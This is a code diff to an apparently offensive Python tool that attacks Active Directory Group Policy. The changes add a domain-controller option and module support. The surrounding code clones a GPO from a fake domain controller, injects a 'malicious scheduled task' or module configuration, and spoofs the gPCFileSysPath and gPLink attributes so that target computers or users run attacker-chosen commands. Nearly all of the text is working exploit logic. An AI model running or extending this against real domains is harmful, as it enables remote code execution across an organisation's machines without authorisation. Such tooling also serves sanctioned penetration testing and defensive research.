@@ -1,5 +1,5 @@
+import os
 import sys
-import time
 import typer
 import socket
 import logging
@@ -15,12 +15,16 @@ from impacket.ntlm                  import compute_lmhash, compute_nthash
 from typing_extensions              import Annotated
 from helpers.smb_utils              import get_smb_connection, download_initial_gpo, upload_directory_to_share, recursive_smb_delete
 from helpers.clean_utils            import init_save_file, save_attribute_value, clean
-from helpers.ldap_utils             import get_attribute, modify_attribute, update_extensionNames, ldap_check_credentials
+from helpers.ldap_utils             import get_attribute, modify_attribute, ldap_check_credentials
 from helpers.scheduledtask_utils    import write_scheduled_task
 from helpers.version_utils          import update_GPT_version_number
 from helpers.ouned_smbserver        import SimpleSMBServer      
 
-from conf                           import bcolors, OUTPUT_DIR, GPOTypes, SMBModes
+from gpblib.parsing.validate        import validate_modules
+from gpblib.utils.extension_names   import generate_extension_names
+from gpblib.modules_configs         import MODULES_CONFIG
+
+from conf                           import bcolors, OUTPUT_DIR
 
 
 def main(
@@ -49,6 +53,10 @@ def main(
             ldaps = True
         else:
             ldaps = False
+        if "dc" in options["GENERAL"].keys() and options["GENERAL"]["dc"]:
+            dc = options["GENERAL"]["dc"]
+        else:
+            dc = domain
 
         target_domain_ldap_session = None
         ldap_server_ldap_session = None
@@ -57,11 +65,11 @@ def main(
             domain = options["GENERAL"]["domain"]
             if "password" in options["GENERAL"].keys() and options["GENERAL"]["password"]:
                 password = options["GENERAL"]["password"]
-                server = Server(f'ldaps://{domain}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{domain}:389', port = 389, use_ssl = False)
+                server = Server(f'ldaps://{dc}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc}:389', port = 389, use_ssl = False)
                 target_domain_ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
             elif "hash" in options["GENERAL"].keys() and options["GENERAL"]["hash"]:
                 hash = options["GENERAL"]["hash"]
-                server = Server(f'ldaps://{domain}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{domain}:389', port = 389, use_ssl = False)
+                server = Server(f'ldaps://{dc}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc}:389', port = 389, use_ssl = False)
                 target_domain_ldap_session = Connection(server, user=f"{domain}\\{username}", password=hash, authentication=NTLM, auto_bind=True)
 
         if "ldap_username" in options["LDAP"].keys() and options["LDAP"]["ldap_username"] and "ldap_password" in options["LDAP"].keys() and options["LDAP"]["ldap_password"]:
@@ -83,7 +91,7 @@ def main(
         options.read(config)
 
         # These arguments are required - we can't perform the exploit without them
-        required_options = {"GENERAL": ["domain", "containerDN", "username", "attacker_ip", "command", "target_type"],
+        required_options = {"GENERAL": ["domain", "containerDN", "username", "attacker_ip", "target_type"],
                             "LDAP": ["ldap_ip", "ldap_username", "ldap_password", "gpo_id", "ldap_machine_name", "ldap_machine_password"],
                             "SMB": ["smb_mode"]}
         for section in required_options.keys():
@@ -97,7 +105,6 @@ def main(
         containerDN = options["GENERAL"]["containerDN"]
         username = options["GENERAL"]["username"]
         attacker_ip = options["GENERAL"]["attacker_ip"]
-        command = options["GENERAL"]["command"]
         target_type = options["GENERAL"]["target_type"].lower()
         ldap_ip = options["LDAP"]["ldap_ip"]
         ldap_username = options["LDAP"]["ldap_username"]
@@ -106,6 +113,12 @@ def main(
         ldap_machine_name = options["LDAP"]["ldap_machine_name"]
         ldap_machine_password = options["LDAP"]["ldap_machine_password"]
         smb_mode = options["SMB"]["smb_mode"].lower()
+
+        # If a DC was specified, use it. Else, defaults to domain
+        if "dc" in options["GENERAL"].keys() and options["GENERAL"]["dc"]:
+            dc = options["GENERAL"]["dc"]
+        else:
+            dc = domain
 
         # These options should have specific accepted values
         if target_type != "computer" and target_type != "user":
@@ -124,6 +137,21 @@ def main(
         else:
             logger.error(f"{bcolors.FAIL}[!] Need at least one of GENERAL>password / GENERAL/hash.{bcolors.ENDC}")
             raise SystemExit
+
+        # We cannot have both a 'command' and a 'module' argument
+        command = None
+        module = None
+        if "command" in options["GENERAL"].keys() and options["GENERAL"]["command"]:
+            command = options["GENERAL"]["command"]
+        if "module" in options["GENERAL"].keys() and options["GENERAL"]["module"]:
+            module = options["GENERAL"]["module"]
+        if command is not None and module is not None:
+            logger.error(f"{bcolors.FAIL}[!] The GENERAL>command option and GENERAL>module option are mutually exclusive.{bcolors.ENDC}")
+            raise SystemExit
+        if command is None and module is None:
+            logger.error(f"{bcolors.FAIL}[!] Need at least one of GENERAL>command or GENERAL>module.{bcolors.ENDC}")
+            raise SystemExit
+
 
         # If LDAPS is equal to True, we will use LDAPS ; else, we use LDAP
         if "ldaps" in options["GENERAL"].keys() and options["GENERAL"]["ldaps"].lower() == "true":
@@ -199,7 +227,7 @@ def main(
         ### Verifying the existence of the LDAP computer account ###
         ### ==================================================== ###
         try:
-            server = Server(f'ldaps://{domain}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{domain}:389', port = 389, use_ssl = False)
+            server = Server(f'ldaps://{dc}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc}:389', port = 389, use_ssl = False)
             check_session = Connection(server, user=f"{domain}\\{ldap_machine_name}", password=ldap_machine_password, authentication=NTLM, auto_bind=True)
         except:
             traceback.print_exc()
@@ -214,7 +242,7 @@ def main(
         ### ================================================================================= ###
         if smb_mode == "forwarded":
             try:
-                server = Server(f'ldaps://{domain}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{domain}:389', port = 389, use_ssl = False)
+                server = Server(f'ldaps://{dc}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc}:389', port = 389, use_ssl = False)
                 check_session = Connection(server, user=f"{domain}\\{smb_machine_name}", password=smb_machine_password, authentication=NTLM, auto_bind=True)
             except:
                 traceback.print_exc()
@@ -337,7 +365,7 @@ def main(
     ### Spoofing the gPCFileSysPath attribute of the cloned GPO, and update its extensions ###
     ### ================================================================================== ###
     logger.warning(f"\n\n{bcolors.BOLD}=== PERFORMING GPO OPERATIONS (CLONING, INJECTING SCHEDULED TASK, UPLOADING TO SMB SERVER IF NEEDED) ==={bcolors.ENDC}")
-    save_file_name = init_save_file(containerDN)
+    save_dir, save_file_name = init_save_file(containerDN)
     logger.warning(f"[*] The save file for current exploit run is {save_file_name}")
 
     logger.warning(f"[*] Cloning GPO {gpo_id} from fakedc {ldap_ip}.")
@@ -352,11 +380,26 @@ def main(
 
     logger.warning(f"[*] Injecting malicious scheduled task into downloaded GPO")
     try:
-        write_scheduled_task(target_type, command, False)
+        if module is not None:
+            logger.warning(f"[*] Module provided - writing module to GPC")
+            module = validate_modules([module])
+            module = module[0]
+            module_name = module.MODULECONFIG.name
+            module_instance = MODULES_CONFIG[module.MODULECONFIG.name]["class"](module.MODULECONFIG, module.MODULEOPTIONS, module.MODULEFILTERS, "", save_dir)
+            module_xml = module_instance.get_xml()
+            root_path = "Machine" if target_type == "computer" else "User"
+            module_path = os.path.join(OUTPUT_DIR, root_path, MODULES_CONFIG[module.MODULECONFIG.name]["gpt_path"].replace('\\', '/'))
+            os.makedirs(os.path.join(OUTPUT_DIR, root_path, '/'.join(MODULES_CONFIG[module.MODULECONFIG.name]["gpt_path"].split("\\")[:-1])), exist_ok=True)
+            with open(module_path, "wb") as f:
+                f.write(module_xml)
+        else:
+            logger.warning(f"[*] Command provided - writing Immediate task to GPC")
+            module_name = "Scheduled Tasks"
+            write_scheduled_task(target_type, command, False)
     except:
-        logger.critical(f"{bcolors.FAIL}[!] Failed to write malicious scheduled task to downloaded GPO. Exiting...{bcolors.ENDC}", exc_info=True)
+        logger.critical(f"{bcolors.FAIL}[!] Failed to write malicious configuration to downloaded GPO. Exiting...{bcolors.ENDC}", exc_info=True)
         sys.exit(1)
-    logger.warning(f"{bcolors.OKGREEN}[+] Successfully injected malicious scheduled task.{bcolors.ENDC}")
+    logger.warning(f"{bcolors.OKGREEN}[+] Successfully injected malicious configuration to downloaded GPO.{bcolors.ENDC}")
     
 
     try:
@@ -385,8 +428,8 @@ def main(
 
     try:
         attribute_name = "gPCMachineExtensionNames" if target_type == "computer" else "gPCUserExtensionNames"
-        extensionName = get_attribute(ldap_server_session, gpo_dn, attribute_name)
-        updated_extensionName = update_extensionNames(extensionName)
+        extensionName = str(get_attribute(ldap_server_session, gpo_dn, attribute_name))
+        updated_extensionName = generate_extension_names(module_name, extensionName)
         logger.warning(f"[*] Modifying {attribute_name} attribute of GPO on fakedc to {updated_extensionName}")
         result = modify_attribute(ldap_server_session, gpo_dn, attribute_name, updated_extensionName)
         if result is not True: raise Exception
@@ -432,7 +475,7 @@ def main(
     ### ============================================== ###
     logger.warning(f"\n\n{bcolors.BOLD}=== SPOOFING THE GPLINK ATTRIBUTE OF THE TARGET OU ==={bcolors.ENDC}")
     try:
-        server = Server(f'ldaps://{domain}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{domain}:389', port = 389, use_ssl = False)
+        server = Server(f'ldaps://{dc}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc}:389', port = 389, use_ssl = False)
         ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
     except:
         print(traceback.print_exc())
@@ -514,7 +557,7 @@ def main(
     except KeyboardInterrupt:
         logger.warning(f"\n\n{bcolors.BOLD}=== Cleaning and restoring previous GPC attribute values ==={bcolors.ENDC}\n")
         # Reinitialize ldap connections, since cleaning can happen long after exploit launch
-        server = Server(f'ldaps://{domain}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{domain}:389', port = 389, use_ssl = False)
+        server = Server(f'ldaps://{dc}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc}:389', port = 389, use_ssl = False)
         if hash is not None:
             ldap_session = Connection(server, user=f"{domain}\\{username}", password=hash, authentication=NTLM, auto_bind=True)
         else:
